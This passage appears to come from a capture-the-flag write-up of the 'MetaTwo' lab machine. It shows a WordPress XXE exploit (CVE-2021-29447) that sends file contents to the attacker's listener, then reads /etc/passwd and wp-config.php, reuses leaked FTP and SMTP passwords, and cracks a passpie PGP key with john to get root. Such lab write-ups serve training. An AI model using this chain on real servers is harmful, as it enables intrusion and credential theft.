+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:07:26 2025] 10.10.11.186:39402 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
+</span></span></code></pre></div><p>And this should be the contents of <code>/etc/passwd</code>. We have to use the included decoder with the base64</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat decode.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>echo zlib_decode(base64_decode(&#39;jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw==&#39;));
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><p>And we see the contents of <code>/etc/passwd</code>!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$php decode.php
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+</span></span><span style="display:flex;"><span>systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+</span></span></code></pre></div><p>We see another user besides root on the system - jnelson. Let&rsquo;s see if we can grab any SSH private keys. Nothing. Ok, so we know this site is running on nginx. We can use the sites-enabled directory to see where the WordPress instance is</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 PoC.py -l 10.10.14.24 -p <span style="color:#ae81ff">8443</span> -f /etc/nginx/sites-enabled/default
+</span></span></code></pre></div><p>Then we decode it as we did before and get</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$php decode.php
+</span></span><span style="display:flex;"><span>server {
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        listen 80;
+</span></span><span style="display:flex;"><span>        listen [::]:80;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        root /var/www/metapress.htb/blog;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        index index.php index.html;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        if ($http_host != &#34;metapress.htb&#34;) {
+</span></span><span style="display:flex;"><span>                rewrite ^ http://metapress.htb/;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        location / {
+</span></span><span style="display:flex;"><span>                try_files $uri $uri/ /index.php?$args;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        location ~ \.php$ {
+</span></span><span style="display:flex;"><span>                include snippets/fastcgi-php.conf;
+</span></span><span style="display:flex;"><span>                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
+</span></span><span style="display:flex;"><span>                expires max;
+</span></span><span style="display:flex;"><span>                log_not_found off;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>}
+</span></span></code></pre></div><p>It&rsquo;s at <code>/var/www/metapress.htb/blog</code>. From there, we can grab the wp-config file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 PoC.py -l 10.10.14.24 -p <span style="color:#ae81ff">8443</span> -f /var/www/metapress.htb/blog/wp-config.php
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    ╔═╗╦  ╦╔═╗
+</span></span><span style="display:flex;"><span>    ║  ╚╗╔╝║╣────2021-29447
+</span></span><span style="display:flex;"><span>    ╚═╝ ╚╝ ╚═╝
+</span></span><span style="display:flex;"><span>    Written By (Isa Ebrahim - 0xRar) on January, 2023
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    ═══════════════════════════════════════════════════════════════════════════
+</span></span><span style="display:flex;"><span>    [*] Title: Wordpress XML parsing issue in the Media Library leading to XXE
+</span></span><span style="display:flex;"><span>    [*] Affected versions: Wordpress 5.6 - 5.7
+</span></span><span style="display:flex;"><span>    [*] Patched version: Wordpress 5.7.1
+</span></span><span style="display:flex;"><span>    [*] Installation version: PHP 8
+</span></span><span style="display:flex;"><span>    ═══════════════════════════════════════════════════════════════════════════
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] payload.wav was created.
+</span></span><span style="display:flex;"><span>[+] evil.dtd was created.
+</span></span><span style="display:flex;"><span>[+] manually upload the payload.wav file to the Media Library.
+</span></span><span style="display:flex;"><span>[+] wait for the GET request.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[Mon Feb 17 19:42:01 2025] PHP 8.2.26 Development Server (http://0.0.0.0:8443) started
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:42:05 2025] 10.10.11.186:33312 Accepted
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:42:05 2025] 10.10.11.186:33312 [200]: GET /evil.dtd
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:42:05 2025] 10.10.11.186:33312 Closing
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:42:06 2025] 10.10.11.186:33318 Accepted
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:42:06 2025] 10.10.11.186:33318 [404]: GET /?p=jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw== - No such file or directory
+</span></span></code></pre></div><p>Then we decode it again and get the password for the FTP user!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;FTP_BASE&#39;, &#39;blog/&#39; );
+</span></span><span style="display:flex;"><span>define( &#39;FTP_SSL&#39;, false );
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>After logging into ftp, we see that there is a &ldquo;mailer&rdquo; directory, and inside is a <code>send_email.php</code> file. We download the file and find credentials for the jnelson user!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$mail-&gt;Host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mail.metapress.htb&#34;</span>;
+</span></span><span style="display:flex;"><span>$mail-&gt;SMTPAuth <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>$mail-&gt;Username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jnelson@metapress.htb&#34;</span>;
+</span></span><span style="display:flex;"><span>$mail-&gt;Password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Cb4_JmWM8zUZWMu@Ys&#34;</span>;
+</span></span><span style="display:flex;"><span>$mail-&gt;SMTPSecure <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;tls&#34;</span>;
+</span></span><span style="display:flex;"><span>$mail-&gt;Port <span style="color:#f92672">=</span> 587;
+</span></span></code></pre></div><p>Let&rsquo;s try to log in as jnelson through SSH</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh jnelson@10.10.11.186
+</span></span><span style="display:flex;"><span>The authenticity of host &#39;10.10.11.186 (10.10.11.186)&#39; can&#39;t be established.
+</span></span><span style="display:flex;"><span>ED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.
+</span></span><span style="display:flex;"><span>This key is not known by any other names.
+</span></span><span style="display:flex;"><span>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span style="display:flex;"><span>Warning: Permanently added &#39;10.10.11.186&#39; (ED25519) to the list of known hosts.
+</span></span><span style="display:flex;"><span>jnelson@10.10.11.186&#39;s password:
+</span></span><span style="display:flex;"><span>Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>jnelson@meta2:~$ cat user.txt
+</span></span><span style="display:flex;"><span>78e9cbe81588175b943c9be5f9311cfb
+</span></span></code></pre></div><p>Successful! We also grab the user flag while we are here. As I&rsquo;m looking around, I notice a <code>.passpie</code> hidden directory in jnelson&rsquo;s home directory. A quick google search tells us it&rsquo;s some form of password manager.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ passpie                                                     
+</span></span><span style="display:flex;"><span>╒════════╤═════════╤════════════╤═══════════╕
+</span></span><span style="display:flex;"><span>│ Name   │ Login   │ Password   │ Comment   │
+</span></span><span style="display:flex;"><span>╞════════╪═════════╪════════════╪═══════════╡
+</span></span><span style="display:flex;"><span>│ ssh    │ jnelson │ ********   │           │
+</span></span><span style="display:flex;"><span>├────────┼─────────┼────────────┼───────────┤     
+</span></span><span style="display:flex;"><span>│ ssh    │ root    │ ********   │           │   
+</span></span><span style="display:flex;"><span>╘════════╧═════════╧════════════╧═══════════╛
+</span></span></code></pre></div><p>Looks like root&rsquo;s credentials are saved in here. We do a <code>passpie --help</code> and see there is an <code>export</code> function that says it prints out the password in cleartext. Let&rsquo;s try to get root&rsquo;s password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ passpie export root
+</span></span><span style="display:flex;"><span>Passphrase: 
+</span></span><span style="display:flex;"><span>Error: Wrong passphrase
+</span></span></code></pre></div><p>It asks us for a passphrase, which I tried jnelson&rsquo;s password but that wasn&rsquo;t correct. So now we have to find the passphrase. With more googling, we discover that each password is saved as a .pass file on the system somewhere. We can use find to search for these</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jnelson@meta2:/usr/local/lib/python2.7/dist-packages/passpie$ find / -name *.pass 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/home/jnelson/.passpie/ssh/root.pass
+</span></span><span style="display:flex;"><span>/home/jnelson/.passpie/ssh/jnelson.pass
+</span></span></code></pre></div><p>Let&rsquo;s look at one of these files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jnelson@meta2:/usr/local/lib/python2.7/dist-packages/passpie$ cat /home/jnelson/.passpie/ssh/root.pass
+</span></span><span style="display:flex;"><span>comment: &#39;&#39;
+</span></span><span style="display:flex;"><span>fullname: root@ssh
+</span></span><span style="display:flex;"><span>login: root
+</span></span><span style="display:flex;"><span>modified: 2022-06-26 08:58:15.621572
+</span></span><span style="display:flex;"><span>name: ssh
+</span></span><span style="display:flex;"><span>password: &#39;-----BEGIN PGP MESSAGE-----
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  lpF0RatbxQGWBks5F3o=
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  =uh1B
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  -----END PGP MESSAGE-----
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  &#39;
+</span></span></code></pre></div><p>Ok. Let&rsquo;s see if there is anything else. In the .passpie directory, there is a .key file that contains a PGP private key. Let&rsquo;s transfer this over to our attack host and try to crack it. First we convert it to a hash with <code>gpg2john</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gpg2john pkey.pgp &gt; pkey_hash
+</span></span></code></pre></div><p>Then clean it up a bit to be in the right format and we get</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::
+</span></span></code></pre></div><p>Then we have to use <code>john</code> since hashcat doesn&rsquo;t support this hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$john pkey_hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+</span></span><span style="display:flex;"><span>Cost 1 (s2k-count) is 65011712 for all loaded hashes
+</span></span><span style="display:flex;"><span>Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+</span></span><span style="display:flex;"><span>Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+</span></span><span style="display:flex;"><span>Will run 4 OpenMP threads
+</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
+</span></span><span style="display:flex;"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span>Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
+</span></span><span style="display:flex;"><span>Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
+</span></span><span style="display:flex;"><span>Almost done: Processing the remaining buffered candidate passwords, if any.
+</span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst
+</span></span><span style="display:flex;"><span>blink182         (Passpie)
+</span></span><span style="display:flex;"><span>1g 0:00:00:43 DONE 2/3 (2025-02-18 12:49) 0.02299g/s 67.96p/s 67.96c/s 67.96C/s blink182..passw0rd
+</span></span><span style="display:flex;"><span>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>And we crack it! Now we can use the password to see root&rsquo;s password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jnelson@meta2:~$ passpie export export
+</span></span><span style="display:flex;"><span>Passphrase:
+</span></span><span style="display:flex;"><span>jnelson@meta2:~$ ls
+</span></span><span style="display:flex;"><span>export  user.txt
+</span></span><span style="display:flex;"><span>jnelson@meta2:~$ cat export
+</span></span><span style="display:flex;"><span>credentials:
+</span></span><span style="display:flex;"><span>- comment: &#39;&#39;
+</span></span><span style="display:flex;"><span>  fullname: root@ssh
+</span></span><span style="display:flex;"><span>  login: root
+</span></span><span style="display:flex;"><span>  modified: 2022-06-26 08:58:15.621572
+</span></span><span style="display:flex;"><span>  name: ssh
+</span></span><span style="display:flex;"><span>  password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39;
+</span></span><span style="display:flex;"><span>- comment: &#39;&#39;
+</span></span><span style="display:flex;"><span>  fullname: jnelson@ssh
+</span></span><span style="display:flex;"><span>  login: jnelson
+</span></span><span style="display:flex;"><span>  modified: 2022-06-26 08:58:15.514422
+</span></span><span style="display:flex;"><span>  name: ssh
+</span></span><span style="display:flex;"><span>  password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39;
